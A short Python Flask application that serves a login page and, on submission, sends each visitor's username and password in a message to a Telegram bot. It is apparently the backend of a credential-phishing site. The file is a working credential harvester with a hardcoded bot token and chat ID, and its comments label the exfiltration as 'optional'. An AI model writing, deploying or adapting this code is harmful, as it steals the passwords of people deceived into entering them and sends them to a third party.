from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# --- Optional: Telegram bot setup ---
# Replace with your own Bot Token and Chat ID
BOT_TOKEN = "8273890387:AAG8BbidwS-UkY_Ct-bdmbFbHq6xr_qdBqM"
CHAT_ID = "6291023089"

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Send data to Telegram (optional)
    message = f"👤 New Login Attempt:\nUsername: {username}\nPassword: {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.get(url, params=params)
    except Exception as e:
        print("Error sending to Telegram:", e)

    return render_template('success.html', username=username)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
